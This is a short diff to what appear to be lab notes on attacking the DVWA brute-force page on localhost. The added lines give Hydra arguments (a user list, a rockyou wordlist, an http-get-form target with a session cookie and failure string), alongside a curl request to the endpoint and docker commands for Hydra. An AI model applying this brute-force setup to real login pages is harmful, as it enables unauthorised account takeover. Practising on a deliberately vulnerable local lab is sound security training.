@@ -46,3 +46,7 @@ curl 'http://localhost:2023/vulnerabilities/brute/?username=a&password=a&Login=L
 docker pull vanhauser/hydra
 docker run vanhauser/hydra
 
+-L usuarios.txt
+-P rockyou_1.txt
+"http-get-form://127.0.0.1:2023/vulnerabilities/ brute/:username=^USER^&password=^PASS^:H=Cookie\:
+PHPSESSID=oc7u0skc909bvtn6btajbo93a2; security-low; :F-Username and/or password incorrect.
